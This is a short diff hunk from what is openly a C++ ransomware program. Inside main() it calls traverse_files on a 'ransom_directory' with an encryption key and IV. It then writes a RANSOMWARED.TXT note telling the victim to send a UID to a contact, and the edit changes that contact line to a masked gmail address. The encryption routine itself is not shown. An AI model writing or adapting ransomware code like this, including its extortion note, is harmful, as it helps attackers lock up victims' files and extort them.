@@ -102,7 +102,7 @@ int main()
 					traverse_files(ransom_directory,key,iv,file_handler);
 					std::cout<<"Ransom complete."<<std::endl;
 					string_to_file("You've been ransomwared.\n"
-						"Please contact the script kiddie that used this and give them the following UID:\n"+
+						"Please contact the script kiddie with xxxx@gmail.com and give them the following UID:\n"+
 						uid,ransom_directory+"/RANSOMWARED.TXT");
 					return 0;
 				}
